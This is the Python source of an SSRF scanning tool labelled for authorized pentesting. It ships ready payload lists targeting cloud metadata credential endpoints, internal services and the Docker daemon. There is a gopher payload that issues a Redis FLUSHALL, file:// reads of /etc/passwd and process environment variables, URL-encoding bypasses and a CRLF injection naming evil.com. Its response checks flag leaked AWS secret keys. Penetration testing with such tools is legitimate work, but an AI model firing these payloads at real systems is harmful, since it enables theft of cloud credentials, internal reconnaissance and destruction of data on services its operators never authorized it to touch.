#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════╗
║           SSRF PROBER v1.0                       ║
║     Professional SSRF Detection Tool             ║
║     For authorized pentesting / bug bounty only  ║
╚══════════════════════════════════════════════════╝

Usage:
    python3 ssrf_prober.py -u "https://target.com/fetch?url=FUZZ" [options]
    python3 ssrf_prober.py -u "https://target.com/api/proxy" -p url,path,src -d '{"url":"FUZZ"}' --json
    python3 ssrf_prober.py -l urls.txt --oob yourserver.burpcollaborator.net --all
"""

import argparse
import asyncio
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime
import ipaddress

try:
    import httpx
except ImportError:
    print("[!] Instala dependencias: pip install httpx")
    sys.exit(1)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich import print as rprint
    RICH = True
except ImportError:
    RICH = False

# ─────────────────────────────────────────────
#  PAYLOADS
# ─────────────────────────────────────────────

INTERNAL_HOSTS = [
    # localhost variants
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",           # Octal
    "http://2130706433",           # Decimal IP
    "http://0x7f000001",           # Hex IP
    "http://127.1",                # Short notation
    "http://127.0.1",
    # Cloud metadata
    "http://169.254.169.254",                                    # AWS/GCP/Azure IMDS
    "http://169.254.169.254/latest/meta-data/",                  # AWS metadata
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",       # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01", # Azure
    "http://100.100.100.200/latest/meta-data/",                  # Alibaba Cloud
    # Common internal services
    "http://192.168.0.1",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "http://localhost:8080",
    "http://localhost:8443",
    "http://localhost:9200",        # Elasticsearch
    "http://localhost:6379",        # Redis (HTTP probe)
    "http://localhost:5984",        # CouchDB
    "http://localhost:2375",        # Docker daemon
    "http://localhost:4848",        # Glassfish admin
    "http://localhost:8161",        # ActiveMQ
    "http://localhost:61616",       # ActiveMQ broker
    "http://localhost:7001",        # WebLogic
    "http://localhost:8888",        # Jupyter / misc
    "http://localhost:3000",        # Grafana / Node apps
    "http://localhost:8500",        # Consul
    "http://localhost:8600",        # Consul DNS
    "http://localhost:2181",        # Zookeeper
]

BYPASS_PAYLOADS = [
    # Protocol abuse
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///windows/win.ini",
    # IP encoding bypasses
    "http://①②⑦.⓪.⓪.①",          # Unicode circled digits
    "http://127。0。0。1",           # Unicode dots
    "http://[0:0:0:0:0:ffff:127.0.0.1]",   # IPv6 mapped IPv4
    "http://[::ffff:7f00:1]",
    "http://[::ffff:127.0.0.1]",
    # DNS rebinding hints
    "http://localtest.me",          # Resolves to 127.0.0.1
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
    "http://spoofed.burpcollaborator.net",  # Placeholder
    # Double URL encoding
    "http://127%2e0%2e0%2e1",
    "http://127%252e0%252e0%252e1",
    # CRLF + redirect tricks (header injection path)
    "http://127.0.0.1%0d%0aHost: evil.com",
]

OOB_PATHS = [
    "/",
    "/ssrf-test",
    "/latest/meta-data/",
    "/v1/",
    "/?ssrf=1",
]

# ─────────────────────────────────────────────
#  DATA STRUCTURES
# ─────────────────────────────────────────────

@dataclass
class SSRFResult:
    url: str
    payload: str
    param: str
    status_code: int
    response_time: float
    response_length: int
    response_snippet: str
    indicators: list[str] = field(default_factory=list)
    severity: str = "INFO"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self):
        return self.__dict__


@dataclass
class ProbeConfig:
    target_url: str
    params: list[str]
    headers: dict
    json_body: Optional[str]
    is_json: bool
    oob_host: Optional[str]
    timeout: float
    concurrency: int
    verify_ssl: bool
    proxies: Optional[str]
    output_file: Optional[str]
    all_payloads: bool
    verbose: bool


# ─────────────────────────────────────────────
#  DETECTION ENGINE
# ─────────────────────────────────────────────

INDICATORS = {
    # AWS metadata
    "ami-id": ("AWS EC2 metadata exposed", "CRITICAL"),
    "instance-id": ("AWS instance metadata exposed", "CRITICAL"),
    "security-credentials": ("AWS IAM credentials possibly exposed", "CRITICAL"),
    '"AccessKeyId"': ("AWS Access Key in response", "CRITICAL"),
    '"SecretAccessKey"': ("AWS Secret Key in response", "CRITICAL"),
    # GCP
    "computeMetadata": ("GCP metadata endpoint hit", "CRITICAL"),
    "google": ("Google Cloud metadata indicator", "HIGH"),
    # Azure
    "Compute": ("Azure metadata indicator", "HIGH"),
    # Generic internal
    "root:x:0:0": ("Linux /etc/passwd content", "CRITICAL"),
    "127.0.0.1": ("Localhost reference in response", "MEDIUM"),
    "192.168.": ("Internal IP range in response", "HIGH"),
    "10.0.": ("Internal IP range in response", "HIGH"),
    "172.16.": ("Internal IP range in response", "HIGH"),
    # Services
    "redis_version": ("Redis info page exposed", "CRITICAL"),
    "elasticsearch": ("Elasticsearch response", "HIGH"),
    "_cluster/health": ("Elasticsearch cluster info", "HIGH"),
    "couchdb": ("CouchDB response", "HIGH"),
    "X-Docker-": ("Docker daemon response", "CRITICAL"),
    "grafana": ("Grafana exposed", "MEDIUM"),
    "consul": ("Consul exposed", "HIGH"),
    # Common internal page markers
    "Internal Server Error": ("Internal error (possible reflection)", "LOW"),
    "Connection refused": ("Port probe: connection refused", "INFO"),
    "<!DOCTYPE html>": ("HTML response to internal probe", "MEDIUM"),
}


def analyze_response(text: str, status: int) -> tuple[list[str], str]:
    """Check response body for SSRF indicators. Returns (indicators, max_severity)."""
    found = []
    max_sev = "INFO"
    sev_order = {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}

    for pattern, (msg, sev) in INDICATORS.items():
        if pattern.lower() in text.lower():
            found.append(f"{sev}: {msg}")
            if sev_order[sev] > sev_order[max_sev]:
                max_sev = sev

    # Status-based heuristics
    if status in (200, 201) and len(text) > 100:
        if max_sev == "INFO":
            max_sev = "LOW"
    if status in (301, 302) and any(h in text.lower() for h in ["169.254", "127.0.0", "localhost"]):
        found.append("MEDIUM: Redirect toward internal resource")
        max_sev = "MEDIUM"

    return found, max_sev


# ─────────────────────────────────────────────
#  REQUEST ENGINE
# ─────────────────────────────────────────────

async def send_probe(
    client: httpx.AsyncClient,
    config: ProbeConfig,
    payload: str,
    param: str,
) -> Optional[SSRFResult]:
    """Inject payload into the target parameter and analyze response."""

    url = config.target_url
    body = None
    req_headers = dict(config.headers)

    try:
        if config.is_json and config.json_body:
            # Inject into JSON body
            raw = config.json_body.replace("FUZZ", payload)
            body = raw
            req_headers["Content-Type"] = "application/json"
            method = "POST"
        elif "FUZZ" in url:
            # Payload directly in URL template
            url = url.replace("FUZZ", urllib.parse.quote(payload, safe=""))
            method = "GET"
        else:
            # Inject as query param
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            qs[param] = [payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            url = parsed._replace(query=new_query).geturl()
            method = "GET"

        t0 = time.monotonic()
        if method == "GET":
            resp = await client.get(url, headers=req_headers)
        else:
            resp = await client.post(url, content=body, headers=req_headers)
        elapsed = time.monotonic() - t0

        text = resp.text[:4096]
        indicators, severity = analyze_response(text, resp.status_code)

        # Only return noteworthy results (unless verbose)
        if not indicators and not config.verbose:
            return None

        return SSRFResult(
            url=url,
            payload=payload,
            param=param,
            status_code=resp.status_code,
            response_time=round(elapsed, 3),
            response_length=len(resp.text),
            response_snippet=text[:300].replace("\n", " "),
            indicators=indicators,
            severity=severity,
        )

    except httpx.TimeoutException:
        if config.verbose:
            return SSRFResult(
                url=url, payload=payload, param=param,
                status_code=0, response_time=config.timeout,
                response_length=0, response_snippet="TIMEOUT",
                indicators=["INFO: Request timed out (possible blind SSRF)"],
                severity="LOW",
            )
    except Exception as e:
        if config.verbose:
            return SSRFResult(
                url=url, payload=payload, param=param,
                status_code=0, response_time=0,
                response_length=0, response_snippet=str(e),
                indicators=[f"INFO: Exception - {type(e).__name__}"],
                severity="INFO",
            )
    return None


async def run_probes(config: ProbeConfig) -> list[SSRFResult]:
    """Run all probes concurrently with rate limiting."""

    # Build payload list
    payloads = list(INTERNAL_HOSTS)
    if config.all_payloads:
        payloads += BYPASS_PAYLOADS

    # Inject OOB host if provided
    if config.oob_host:
        oob_base = f"http://{config.oob_host}"
        for path in OOB_PATHS:
            payloads.append(oob_base + path)

    # Determine params to test
    params = config.params if config.params else ["url"]

    # Setup proxy
    proxy = config.proxies or None

    transport = None
    if proxy:
        transport = httpx.AsyncHTTPTransport(proxy=proxy)

    results: list[SSRFResult] = []
    semaphore = asyncio.Semaphore(config.concurrency)
    total = len(payloads) * len(params)

    async def bounded_probe(payload, param):
        async with semaphore:
            return await send_probe(client, config, payload, param)

    async with httpx.AsyncClient(
        timeout=config.timeout,
        verify=config.verify_ssl,
        follow_redirects=False,
        transport=transport,
    ) as client:
        if RICH:
            console = Console()
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold cyan]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TextColumn("({task.completed}/{task.total})"),
                console=console,
            ) as progress:
                task = progress.add_task("Probing...", total=total)
                tasks = [bounded_probe(p, param) for param in params for p in payloads]
                for coro in asyncio.as_completed(tasks):
                    result = await coro
                    progress.advance(task)
                    if result:
                        results.append(result)
                        _print_result(result)
        else:
            tasks = [bounded_probe(p, param) for param in params for p in payloads]
            for i, coro in enumerate(asyncio.as_completed(tasks), 1):
                result = await coro
                print(f"\r[{i}/{total}]", end="", flush=True)
                if result:
                    results.append(result)
                    _print_result(result)
            print()

    return results


# ─────────────────────────────────────────────
#  OUTPUT
# ─────────────────────────────────────────────

SEV_COLORS = {
    "CRITICAL": "\033[91m",
    "HIGH": "\033[38;5;208m",
    "MEDIUM": "\033[93m",
    "LOW": "\033[94m",
    "INFO": "\033[90m",
}
RESET = "\033[0m"


def _print_result(r: SSRFResult):
    color = SEV_COLORS.get(r.severity, "")
    indicators_str = " | ".join(r.indicators) if r.indicators else "—"
    print(
        f"\n{color}[{r.severity}]{RESET} "
        f"HTTP {r.status_code} | {r.response_length}B | {r.response_time}s\n"
        f"  Param : {r.param}\n"
        f"  Payload: {r.payload}\n"
        f"  Hits  : {indicators_str}\n"
        f"  Snippet: {r.response_snippet[:120]}..."
    )


def print_summary(results: list[SSRFResult]):
    if not results:
        print("\n[✓] No SSRF indicators found in responses.")
        return

    sev_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for r in results:
        sev_count[r.severity] = sev_count.get(r.severity, 0) + 1

    print("\n" + "═" * 60)
    print("  SSRF PROBE SUMMARY")
    print("═" * 60)
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        count = sev_count[sev]
        if count:
            color = SEV_COLORS[sev]
            print(f"  {color}{sev:<10}{RESET} {count} finding(s)")
    print("═" * 60)


def save_output(results: list[SSRFResult], path: str):
    data = [r.to_dict() for r in results]
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"\n[+] Results saved to {path}")


# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────

def banner():
    print("""
\033[36m╔══════════════════════════════════════════════════╗
║           SSRF PROBER v1.0                       ║
║     For authorized pentesting / bug bounty only  ║
╚══════════════════════════════════════════════════╝\033[0m
""")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Professional SSRF Detection Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic GET param injection
  python3 ssrf_prober.py -u "https://target.com/fetch?url=FUZZ"

  # Multiple params
  python3 ssrf_prober.py -u "https://target.com/api" -p url,redirect,src

  # JSON POST body
  python3 ssrf_prober.py -u "https://api.target.com/proxy" \\
      -d '{"endpoint":"FUZZ","method":"GET"}' --json

  # With OOB callback server (Burp Collaborator / interactsh)
  python3 ssrf_prober.py -u "https://target.com/fetch?url=FUZZ" \\
      --oob abc123.oastify.com

  # All bypass payloads + through Burp proxy
  python3 ssrf_prober.py -u "https://target.com/api?url=FUZZ" \\
      --all --proxy http://127.0.0.1:8080 -o results.json

  # From URL list (one per line, each with FUZZ or ?url= param)
  python3 ssrf_prober.py -l urls.txt --all -o results.json
        """,
    )

    target = parser.add_mutually_exclusive_group(required=True)
    target.add_argument("-u", "--url", help="Target URL. Use FUZZ as injection point.")
    target.add_argument("-l", "--list", help="File with list of target URLs (one per line).")

    parser.add_argument(
        "-p", "--params",
        default="url",
        help="Comma-separated parameter names to inject (default: url)",
    )
    parser.add_argument(
        "-d", "--data",
        help="JSON body template. Use FUZZ as injection point. Requires --json.",
    )
    parser.add_argument(
        "--json", action="store_true",
        help="Send requests as JSON POST.",
    )
    parser.add_argument(
        "--oob",
        help="OOB callback host (Burp Collaborator, interactsh, etc.)",
    )
    parser.add_argument(
        "-H", "--header", action="append", dest="headers", default=[],
        help='Extra header(s). Format: "Name: Value". Can be used multiple times.',
    )
    parser.add_argument(
        "--cookie",
        help="Cookie header value (e.g. session=abc123)",
    )
    parser.add_argument(
        "--proxy",
        help="HTTP proxy (e.g. http://127.0.0.1:8080)",
    )
    parser.add_argument(
        "--timeout", type=float, default=8.0,
        help="Request timeout in seconds (default: 8)",
    )
    parser.add_argument(
        "-c", "--concurrency", type=int, default=20,
        help="Max concurrent requests (default: 20)",
    )
    parser.add_argument(
        "--no-verify", action="store_true",
        help="Disable SSL verification",
    )
    parser.add_argument(
        "--all", action="store_true",
        help="Include bypass payloads (gopher, dict, file://, encoding tricks)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Save results to JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Show all requests including non-findings",
    )

    return parser.parse_args()


def build_headers(args) -> dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    }
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie
    return headers


async def main():
    banner()
    args = parse_args()
    params = [p.strip() for p in args.params.split(",")]
    headers = build_headers(args)

    targets = []
    if args.url:
        targets = [args.url]
    elif args.list:
        with open(args.list) as f:
            targets = [line.strip() for line in f if line.strip()]

    all_results: list[SSRFResult] = []

    for target_url in targets:
        if len(targets) > 1:
            print(f"\n[→] Target: {target_url}")

        config = ProbeConfig(
            target_url=target_url,
            params=params,
            headers=headers,
            json_body=args.data,
            is_json=args.json,
            oob_host=args.oob,
            timeout=args.timeout,
            concurrency=args.concurrency,
            verify_ssl=not args.no_verify,
            proxies=args.proxy,
            output_file=args.output,
            all_payloads=args.all,
            verbose=args.verbose,
        )

        results = await run_probes(config)
        all_results.extend(results)

    print_summary(all_results)

    if args.output:
        save_output(all_results, args.output)


if __name__ == "__main__":
    asyncio.run(main())
